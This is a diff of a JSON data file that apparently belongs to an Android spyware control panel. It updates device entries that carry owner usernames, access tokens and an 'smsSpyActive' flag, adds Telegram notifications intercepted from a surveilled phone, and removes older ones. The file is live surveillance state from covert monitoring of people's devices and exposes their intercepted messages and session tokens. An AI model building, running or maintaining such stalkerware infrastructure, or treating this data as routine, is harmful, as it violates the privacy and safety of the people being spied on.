@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776780528589,
+    "lastSeen": 1776780530505,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 21:08",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776780531626
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:08",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776780531590
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16924 pesan baru dari 118 obrolan",
+        "time": "21/04 21:08",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776780531503
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 21:08",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776780528906
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:08",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776780528890
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -14362,46 +14402,6 @@
         "time": "21/04 20:33",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776778407873
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 20:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778407854
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 20:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778407828
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 20:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778407803
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 20:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778407786
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16850 pesan baru dari 118 obrolan",
-        "time": "21/04 20:33",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778407769
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776780528495,
+    "lastSeen": 1776780531432,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
